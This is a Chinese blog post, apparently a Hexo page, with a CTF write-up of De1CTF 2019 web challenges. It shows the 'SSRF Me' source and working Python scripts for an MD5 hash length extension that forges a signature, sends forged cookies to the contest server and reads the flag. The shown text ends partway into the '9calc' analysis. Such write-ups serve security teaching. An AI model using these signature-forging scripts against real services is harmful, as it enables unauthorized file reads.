@@ -1,0 +1,1062 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,ctf,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="之前各种比赛还有开发拖了一堆时间，鸽到了现在才写完OrzXman期间的一场国际赛，有自己学校大佬出的题于是去做了一波，感觉好多原题。但我还是要说一句BUUCTF牛逼！">
+<meta name="keywords" content="web,ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="De1CTF2019 web wp">
+<meta property="og:url" content="http://yoursite.com/2019/08/13/De1CTF2019-web-wp/index.html">
+<meta property="og:site_name" content="k0t0r1の家">
+<meta property="og:description" content="之前各种比赛还有开发拖了一堆时间，鸽到了现在才写完OrzXman期间的一场国际赛，有自己学校大佬出的题于是去做了一波，感觉好多原题。但我还是要说一句BUUCTF牛逼！">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/8becacd04f668c3b27a5ac12513a8bbe.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/25123b379be4290612bb75a83a429132.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/96bb94856ffbef2d54dc109774cde74a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/7df053430a07f62653da37805352b3ce.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/487c3902ca6c5fda7ea6ef2b928623dd.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/7c33bdbfc1922bfe4317e5c739a345f0.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/a531f81358c641ecbc3ed234a746310e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/81a32fb6bd2255087af30e3620d17430.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/2bc5cfefee26bb589760ac1fa8178867.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/8cc4d1aec7d1edcd678ec4e4941ca126.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/c12888d13d7edc7df76a8213e2a6f44a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/5d903f235ed05d312a2529d91e74fc74.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/db9062d1057adf444ac5adf68d6f9473.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/b5190a772f19034634daafbd97c6fc7d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/1a2fcc5bb6aa4fc219da0a1d96c35837.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/4853a2c99d5a194c8733fc77a181e567.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/3901abb2497395f9f1a8852cf20fd1bd.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/949b8b4e604a1f5f12555b95e8b2eee6.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/03aee1198226ff7f4e30fce1e25b3df3.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/ebeb5da38590ab2a2c353744befcdec1.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/71ee0536c0cf791ac2f3759c5b9ce0cb.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/78813631cfe960831ecac95cabcb91a5.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/7d6dc3e1e0a771f47dd777dfa592aedb.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/d70d856037b1e42dc486926bc627b31c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/09dfdeec4400c3cef8e7cd190f718c3c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/7e58522c4650556212d1ace96b01aa50.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/665319192c8ce3c74b58d8660b0cf0f9.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/1b6790918bbd93d28738d65ecee5598c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/2dcd1673babafdc6d7e654cdc0e2c3e8.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/fcb90cd3070d754992015b6e9c57c326.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/f0dbe278dbe9e60539389e5ca3c40c26.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/b6eb9d48e930e60fa8802a2aea88c158.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/b9d29958e1711f43fdda8a74927ea7ac.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/5ca280c5cdb5b67cd4e0ea99502d003f.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/b850c54ab36d6e4c395c2342dd109147.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/a8c0e0b78d529621d69bd78d6f315b0a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/837acc37361dfef5762719aa7f107870.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/fd4cf04fecbf9edbed4955b351208042.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/743a5258a8c566d800e22844bf1af584.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/8fc88668ce59583c80c682b95fa0832e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/94f3de7b0928eac2c746753864f676c2.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/b2c6264af698713d192741c5ac549822.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/f3baf91044dcabece8ceddfc3a2915d6.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/a1c9c08fa31e6f8a92220a1126f34a80.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/489fb28e95aa1a13b257f636371a4563.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/ce067b6270591ca5783f92c27f1d88eb.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/ac3aa710d01bfd7638c75a2aa4c273ea.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/b4ae6b8bba7048702da710975ff80e82.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/012ad61e997f63d535216e680a1c6b48.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/9e433a807da55cf9667fdcdc54b14b51.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/aa93c4ff3b432959bbf68c1f07194e8a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/190885bc76197813cda74cc78cecb6bb.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/d58d0cec71c6b8b0374b3311c6d3998a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/98804055f70a843d728d292e1192492e.png">
+<meta property="og:updated_time" content="2019-11-29T15:54:08.738Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="De1CTF2019 web wp">
+<meta name="twitter:description" content="之前各种比赛还有开发拖了一堆时间，鸽到了现在才写完OrzXman期间的一场国际赛，有自己学校大佬出的题于是去做了一波，感觉好多原题。但我还是要说一句BUUCTF牛逼！">
+<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/De1CTF2019_web_wp/8becacd04f668c3b27a5ac12513a8bbe.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/13/De1CTF2019-web-wp/">
+
+
+
+
+
+  <title>De1CTF2019 web wp | k0t0r1の家</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">k0t0r1の家</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/13/De1CTF2019-web-wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="k0t0r1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="k0t0r1の家">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">De1CTF2019 web wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-13T15:44:12+08:00">
+                2019-08-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>之前各种比赛还有开发拖了一堆时间，鸽到了现在才写完Orz<br>Xman期间的一场国际赛，有自己学校大佬出的题于是去做了一波，感觉好多原题。但我还是要说一句BUUCTF牛逼！</p>
+<a id="more"></a>
+<h2 id="SSRF-Me"><a href="#SSRF-Me" class="headerlink" title="SSRF Me"></a>SSRF Me</h2><p>先读读源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return f.open(&quot;code.txt&quot;,&apos;r&apos;).read()</span><br></pre></td></tr></table></figure>
+<p>/读取直接给源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def geneSign(): </span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
+<p>/geneSign提供key+param+”sacn”的md5值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))  readscan</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) flag.txt</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) md5(key+flag.txtread+scan)</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return task.Exec()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def waf(param):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure>
+<p>/De1ta是这题的关键，获得param，sign，action后，waf检测是否有gopher和file，这里就不能用这两个协议读了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&apos;code&apos;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                return resp</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&apos;data&apos;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">                result[&apos;data&apos;] = f.read()</span><br><span class="line">            if result[&apos;code&apos;] == 500:</span><br><span class="line">                result[&apos;data&apos;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&apos;code&apos;] = 500</span><br><span class="line">            result[&apos;msg&apos;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(url).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br></pre></td></tr></table></figure>
+<p>然后是这个Task类，可以看到根据ip生成了沙盒防止互相读取。然后exec()中会检查<code>key+param+action</code>的md5值是否与sign值相等，相等若action为scan则读取param对应的文件并写入result.txt。为read时则将result.txt读出</p>
+<p>那思路就很清晰了，用scan读取flag，然后哈希拓展绕过检查再read读出flag</p>
+<p>但是做题时一直在想gopher和file这些协议被过滤了，有什么其他协议能用。做到后面发现urlopen其实可以用flag.txt打开当前目录下的文件，测试了几下，好像没用上任何协议时，会默认用file协议读</p>
+<p>接下来就好搞了，用<code>/geneSign?param=flag.txt</code>获取哈希值然后访问<code>/De1ta?param=flag.txt</code>，<code>cookie:action=scan</code>读取flag。然后再用<code>/geneSign</code>一波获取哈希值，接着哈希长度扩列获得<code>scan%80%00.....%a0%00...read</code>的哈希值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import my_md5</span><br><span class="line"></span><br><span class="line">samplehash=&quot;e0875c4e6149bc7fd90b7ed1548b04df&quot;</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line">s.append(samplehash[0:8])</span><br><span class="line">s.append(samplehash[8:16])</span><br><span class="line">s.append(samplehash[16:24])</span><br><span class="line">s.append(samplehash[24:32])</span><br><span class="line"></span><br><span class="line">p = []</span><br><span class="line">for i in s:</span><br><span class="line">	p.append(i[6:8]+i[4:6]+i[2:4]+i[0:2])</span><br><span class="line">s1 = int(p[0],16)</span><br><span class="line">s2 = int(p[1],16)</span><br><span class="line">s3 = int(p[2],16)</span><br><span class="line">s4 = int(p[3],16)</span><br><span class="line"></span><br><span class="line">num = 16</span><br><span class="line">secret = &quot;a&quot;*num	</span><br><span class="line">secret_str = secret+&apos;scan&apos;+&apos;\x80&apos;</span><br><span class="line">value = &apos;read&apos;</span><br><span class="line">padding = 64-len(secret_str)-8</span><br><span class="line">secret_str = secret_str+&apos;\x00&apos;*padding+&quot;\xa0&quot;+&quot;\x00&quot;*7+value</span><br><span class="line">print len(secret_str)</span><br><span class="line"></span><br><span class="line">r = my_md5.deal_rawInputMsg(secret_str)</span><br><span class="line">inp = r[len(r)/2:]</span><br><span class="line">print inp</span><br><span class="line">print &quot;getmein:&quot;+my_md5.run_md5(s1,s2,s3,s4,inp)</span><br></pre></td></tr></table></figure>
+<p>但是发现param传%7f以上会导致服务器问题(应该是get请求的问题)，懵逼了好久发现action只是检测存在并不是相等，于是cookie一波拿flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*- </span><br><span class="line">from Crypto.Util.strxor import strxor</span><br><span class="line">from base64 import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">num = 16			</span><br><span class="line">secret = &quot;a&quot;*num	</span><br><span class="line">secret_str = secret+&apos;scan&apos;+&apos;\x80&apos;	</span><br><span class="line">value = &apos;read&apos;			</span><br><span class="line">padding = 64-len(secret_str)-8</span><br><span class="line">secret_str = &apos;%80&apos;+&apos;%00&apos;*padding+&quot;%a0&quot;+&quot;%00&quot;*7+value</span><br><span class="line"></span><br><span class="line">url = r&apos;http://139.180.128.86/De1ta?param=scan&apos;</span><br><span class="line">cookie = &#123;&apos;action&apos;: secret_str,&apos;sign&apos;: &apos;4e5e3cd2e040a695869c672ada5af0dd&apos;&#125;</span><br><span class="line">http = requests.get(url,cookies=cookie)</span><br><span class="line"></span><br><span class="line">print http.content</span><br></pre></td></tr></table></figure>
+<p>然后看到有其他大佬用了<code>load_file:xxx</code>这样去读<br>还有最牛逼的操作就是<code>/geneSign?param=flag.txtread</code>拿一波哈希值，然后<code>/De1ta?param=flag.txt</code>，<code>cookie:action=readscan</code>，这样就能不用哈希长度扩列。然后可以看到scan和read的if并不是连在一起的，是分开判断的，也就是说能同时触发这两个。然后一波就那道flag了【跪</p>
+<p>不过这题本意是要用<code>CVE-2019-9948</code>这个漏洞来解的，有时间再看看吧</p>
+<h2 id="9calc"><a href="#9calc" class="headerlink" title="9calc"></a>9calc</h2><p>这题是RCTF的calcalcalc的修补版，估计也是zsx师傅一开始的预期解吧。这次对ts部分是怎么运作更加了解了，补一下RCTF那留下的坑</p>
+<p>首先是main.ts</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.useGlobalPipes(new ValidationPipe(&#123;</span><br><span class="line">	disableErrorMessages: true,</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>
+<p>主要关注这部分代码，设置了全局验证功能</p>
+<p>然后就是最重要的app.controller.ts的calculate部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Post(&apos;/calculate&apos;)</span><br><span class="line">calculate(@Body() calculateModel: CalculateModel, @Res() res: Response)</span><br></pre></td></tr></table></figure>
+<p>这里将@Body，也就是req.body给传入了calculateModel中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">export default class CalculateModel &#123;</span><br><span class="line"></span><br><span class="line">	@IsNotEmpty()</span><br><span class="line">	@ExpressionValidator(15, &#123;</span><br><span class="line">		message: &apos;Invalid input&apos;,</span><br><span class="line">	&#125;)</span><br><span class="line">	public readonly expression: string;</span><br><span class="line"></span><br><span class="line">	@IsBoolean()</span><br><span class="line">	public readonly isVip: boolean = false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后calculateModel中的expression就被赋予了post过来的expression的值，然后就是验证器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">export function ExpressionValidator(property: number, validationOptions?: ValidationOptions) &#123;</span><br><span class="line">	return (object: Object, propertyName: string) =&gt; &#123;</span><br><span class="line">		registerDecorator(&#123;</span><br><span class="line">			name: &apos;ExpressionValidator&apos;,</span><br><span class="line">			target: object.constructor,</span><br><span class="line">			propertyName,</span><br><span class="line">			constraints: [property],</span><br><span class="line">			options: validationOptions,</span><br><span class="line">			validator: &#123;</span><br><span class="line">				validate(value: any, args: ValidationArguments) &#123;</span><br><span class="line">					const str = value ? value.toString() : &apos;&apos;;</span><br><span class="line">					if (str.length === 0) &#123;</span><br><span class="line">						return false;</span><br><span class="line">					&#125;</span><br><span class="line">					if (!(args.object as CalculateModel).isVip) &#123;</span><br><span class="line">						if (str.length &gt;= args.constraints[0]) &#123;</span><br><span class="line">							return false;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					if (!/^[0-9a-z\[\]\+\-\*\/ \t]+$/i.test(str)) &#123;</span><br><span class="line">						return false;</span><br><span class="line">					&#125;</span><br><span class="line">					return true;</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;);</span><br><span class="line">   &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个验证器的目标只是用来验证一个数据的，因此<code>value:any</code>得到的值便是expression的值。然后可以看到相较calcalcalc，这里的正则少了<code>()</code>，这也就防止了之前的非预期解</p>
+<p>回到app.controller.ts上</p>
